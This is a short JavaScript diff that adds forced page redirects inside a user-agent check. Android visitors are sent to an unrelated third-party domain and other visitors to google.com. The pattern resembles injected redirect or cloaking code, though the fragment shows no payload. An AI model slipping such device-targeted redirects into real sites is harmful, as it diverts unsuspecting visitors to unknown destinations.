@@ -34,8 +34,10 @@
    var url;
     if (navigator.userAgent.includes('Android')) {
       url = 'https://theviennesegirl.com/';
+	     window.location.href = url;
     } else {
       url = 'https://www.google.com/';
+	      window.location.href = url;
     }
 
     var iframe = document.createElement('iframe');
